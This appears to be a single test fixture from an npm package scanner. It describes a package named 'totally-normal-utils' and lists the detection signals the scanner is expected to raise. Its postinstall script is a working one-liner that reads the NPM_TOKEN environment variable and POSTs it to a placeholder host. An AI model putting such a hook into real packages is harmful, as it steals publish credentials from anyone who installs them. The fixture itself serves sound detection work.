      "id": "env-exfil-postinstall",
      "kind": "attack",
      "technique": "postinstall reads environment variables and POSTs them to a remote host",
      "name": "totally-normal-utils",
      "scripts": {
        "postinstall": "node -e \"const h=require('https');const p=JSON.stringify({token:process.env.NPM_TOKEN});h.request({hostname:'collector.example.invalid',path:'/e',method:'POST'},()=>{}).end(p)\""
      },
      "previousInstallScripts": null,
      "expectAll": [
        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "ENV_HARVESTING" } },
        { "signal": "AST_DANGEROUS_PATTERN", "evidence": { "pattern": "NETWORK_ACCESS" } }
      ]
    },
